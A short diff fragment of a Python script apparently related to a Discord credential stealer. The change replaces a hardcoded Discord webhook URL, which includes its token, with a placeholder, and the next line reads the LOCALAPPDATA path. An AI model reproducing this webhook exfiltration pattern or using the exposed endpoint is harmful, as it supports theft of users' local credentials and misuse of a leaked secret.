@@ -168,7 +168,7 @@ try:
 except:
     pass
 
-webhook = ("https://discord.com/api/webhooks/1019369541572231278/eeJrmidWD9en7yD4fwRe-gbPDc2Jjb-ebp-rOqW8pwGj9o-bK3VI-fHuwMKzF74RSgif")
+webhook = ("webhooker")
 
 
 LOCAL = os.getenv("LOCALAPPDATA")
